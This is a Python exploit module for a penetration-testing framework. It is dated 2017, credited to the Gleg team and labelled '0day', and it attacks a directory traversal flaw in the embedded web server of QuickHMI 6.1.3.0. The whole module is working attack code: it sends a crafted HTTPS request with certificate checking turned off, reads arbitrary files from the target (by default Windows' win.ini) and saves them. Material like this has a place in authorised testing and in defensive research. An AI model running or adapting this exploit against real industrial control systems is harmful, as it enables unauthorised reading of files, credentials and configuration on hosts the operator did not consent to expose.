#!/usr/bin/env python

import urllib2
import ssl
from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_quickhmi_directory_traversal"
INFO['DESCRIPTION'] = "QuickHMI Directory Traversal "
INFO['VENDOR'] = "http://www.quickhmi.de/start.html"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG'] = "5 Oct, 2017. Written by Gleg team."
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    Embedded web server is vulnerable to directory traversal.
Tested against QuickHMI 6.1.3.0 on Windows 7 SP1 x64.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.2"
OPTIONS["PORT"] = 6062
OPTIONS["FILENAME"] = '../../../../../windows/win.ini'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"])

    def make_req(self, path=''):
        url = 'https://%s:%s/%s' % (self.host, self.port, path)
        context = ssl._create_unverified_context()
        res = urllib2.urlopen(url, context=context).read()
        return res

    def run(self):
        #Get options from gui
        self.args()
        self.log('[*] Getting contents of %s' % self.filename)
        res = self.make_req(self.filename)
        if len(res) < 10000:
            self.log('[+]\r\n' + res)
        self.writefile(res)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
